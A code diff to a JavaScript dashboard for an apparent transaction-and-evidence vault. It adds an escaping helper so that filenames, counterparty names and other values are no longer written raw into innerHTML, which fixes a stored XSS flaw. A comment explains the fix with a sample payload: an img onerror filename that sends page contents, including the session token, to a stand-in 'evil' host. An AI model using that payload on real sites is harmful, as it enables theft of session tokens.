@@ -138,6 +138,27 @@ const money = (m) => m === null || m === undefined ? "—"
   : "₹" + (m / 100).toFixed(2).replace(/\B(?=(\d{3})+(?!\d))/g, ",");
 const clock = () => new Date().toTimeString().slice(0, 8);
 
+/**
+ * Escape API- and event-derived values before they reach an innerHTML sink.
+ *
+ * This is not theoretical: attachment filenames come from email headers, flow
+ * through intake into `documents.original_filename`, and are rendered in the
+ * transaction list, the evidence card, and the live feed. Anyone who can email
+ * the vault address could otherwise name a file
+ * `<img src=x onerror=fetch('//evil/'+document.body.innerHTML)>` and exfiltrate
+ * the page — which, on this page, includes the API session token.
+ *
+ * Quotes are escaped too because several values land inside single-quoted
+ * attributes (data-id, class), where &apos; alone would let an attacker close
+ * the attribute.
+ */
+const esc = (v) => v === null || v === undefined ? "" : String(v)
+  .replace(/&/g, "&amp;")
+  .replace(/</g, "&lt;")
+  .replace(/>/g, "&gt;")
+  .replace(/"/g, "&quot;")
+  .replace(/'/g, "&#39;");
+
 let selected = null;
 
 async function refresh() {
@@ -171,19 +192,19 @@ async function refresh() {
   box.innerHTML = t.transactions.map((x) => {
     const legs = (x.legs || []).map((l) =>
       "<div class='leg'><span class='" + (l.leg === "debit" ? "d" : "c") + "'>"
-      + l.leg.padEnd(6) + "</span><span>" + money(l.amount_minor) + "</span>"
-      + "<span class='a'>" + l.account + "</span></div>").join("");
+      + esc(l.leg).padEnd(6) + "</span><span>" + money(l.amount_minor) + "</span>"
+      + "<span class='a'>" + esc(l.account) + "</span></div>").join("");
     const ev = (x.evidence || []).map((e) =>
-      "<div class='ev'><span class='role'>" + e.evidence_role + "</span>"
-      + "<span>" + e.original_filename + "</span></div>").join("");
+      "<div class='ev'><span class='role'>" + esc(e.evidence_role) + "</span>"
+      + "<span>" + esc(e.original_filename) + "</span></div>").join("");
     const multi = (x.evidence || []).length > 1
       ? "<span class='badge2'>" + x.evidence.length + " DOCS · ONE RUPEE</span>" : "";
-    return "<div class='txn" + (selected === x.id ? " sel" : "") + "' data-id='" + x.id + "'>"
-      + "<div class='r1'><span class='tag " + x.direction + "'>" + x.direction.toUpperCase() + "</span>"
+    return "<div class='txn" + (selected === x.id ? " sel" : "") + "' data-id='" + esc(x.id) + "'>"
+      + "<div class='r1'><span class='tag " + esc(x.direction) + "'>" + esc(x.direction).toUpperCase() + "</span>"
       + "<span class='amt'>" + money(x.amount_minor) + "</span>" + multi
-      + "<span class='cp'>" + (x.counterparty_name || "no counterparty — own accounts") + "</span></div>"
-      + "<div class='meta'>" + x.occurred_at + " · " + x.fy_key + " · rail=" + (x.payment_rail || "?")
-      + " · " + x.status + "</div>"
+      + "<span class='cp'>" + esc(x.counterparty_name || "no counterparty — own accounts") + "</span></div>"
+      + "<div class='meta'>" + esc(x.occurred_at) + " · " + esc(x.fy_key) + " · rail=" + esc(x.payment_rail || "?")
+      + " · " + esc(x.status) + "</div>"
       + "<div class='legs'>" + legs + ev + "</div></div>";
   }).join("");
 
@@ -202,19 +223,19 @@ async function showCard(id) {
       // join that collapsed them into one transaction.
       c.evidence.filter((o) => o.extraction && o.extraction.reference_ids
         && Object.values(o.extraction.reference_ids).includes(v)).length > 1
-        ? "<em>" + k + "=" + v + "</em>" : k + "=" + v).join("  ");
-    return "<div class='doc'><div class='fn'>" + e.original_filename + "</div>"
-      + "<div class='rf'>" + e.evidence_role + " · linked by " + e.linked_by
+        ? "<em>" + esc(k) + "=" + esc(v) + "</em>" : esc(k) + "=" + esc(v)).join("  ");
+    return "<div class='doc'><div class='fn'>" + esc(e.original_filename) + "</div>"
+      + "<div class='rf'>" + esc(e.evidence_role) + " · linked by " + esc(e.linked_by)
       + (e.match_score ? " at " + Number(e.match_score).toFixed(2) : "")
       + (shared ? "<br>" + shared : "") + "</div></div>";
   }).join("");
   const prov = (c.provenance || []).map((p) =>
-    p.field + "=" + p.value + " [" + p.source + "]").join("   ");
+    esc(p.field) + "=" + esc(p.value) + " [" + esc(p.source) + "]").join("   ");
   document.getElementById("card").innerHTML =
     "<div class='card'><h3>Evidence · " + money(t.amount_minor) + " · "
-    + (t.counterparty_name || "transfer") + "</h3>" + docs
+    + esc(t.counterparty_name || "transfer") + "</h3>" + docs
     + (prov ? "<div class='prov'>" + prov + "</div>" : "")
-    + "<div class='sum'>" + c.summary + "</div></div>";
+    + "<div class='sum'>" + esc(c.summary) + "</div></div>";
   refresh();
 }
 
@@ -234,7 +255,7 @@ function push(type, data) {
   const d = document.createElement("div");
   d.className = "fe " + type;
   const say = DESC[type] ? DESC[type](data) : type;
-  d.innerHTML = "<span class='t'>" + clock() + "</span><span class='n'>" + say + "</span>";
+  d.innerHTML = "<span class='t'>" + clock() + "</span><span class='n'>" + esc(say) + "</span>";
   f.prepend(d);
   while (f.children.length > 80) f.lastChild.remove();
 }
